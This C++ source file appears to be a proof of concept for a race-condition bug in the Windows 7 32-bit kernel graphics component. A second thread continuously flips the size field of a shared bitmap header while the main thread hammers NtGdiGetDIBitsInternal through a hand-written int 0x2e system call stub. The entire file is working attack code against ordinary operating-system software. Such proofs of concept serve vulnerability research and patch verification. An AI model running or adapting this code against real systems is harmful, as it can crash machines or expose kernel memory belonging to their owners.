#include <Windows.h>

namespace globals {
  BITMAPCOREHEADER header = { sizeof(BITMAPCOREHEADER), // bcSize
                              1,                        // bcWidth
                              1,                        // bcHeight
                              1,                        // bcPlanes
                              1                         // bcBitCount
                            };
  BYTE padding[sizeof(BITMAPINFOHEADER) - sizeof(BITMAPCOREHEADER)];
}  // namespace globals

// For native 32-bit execution.
extern "C"
ULONG CDECL SystemCall32(DWORD ApiNumber, ...) {
  __asm("mov $ApiNumber, %eax");
  __asm("lea $(ApiNumber + 4), %edx");
  __asm("int $0x2e");
}

DWORD WINAPI ThreadProc(LPVOID lpParameter) {
  DWORD xor_op = sizeof(BITMAPCOREHEADER) ^ sizeof(BITMAPINFOHEADER);;
  while (1) {
    globals::header.bcSize ^= xor_op;
  }
}

int main() {
  // Windows 7 32-bit.
  CONST ULONG __NR_NtGdiGetDIBitsInternal = 0x10b3;

  // Initialize the graphic subsystem for this process.
  LoadLibraryA("gdi32.dll");

  // Create the flipping thread.
  CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);

  // Race the implementation in this thread.
  while (1) {
    SystemCall32(__NR_NtGdiGetDIBitsInternal, 0, 1, 0, 1, 1, &globals::header, 0, 0, 0);
  }
  
  return 0;
}
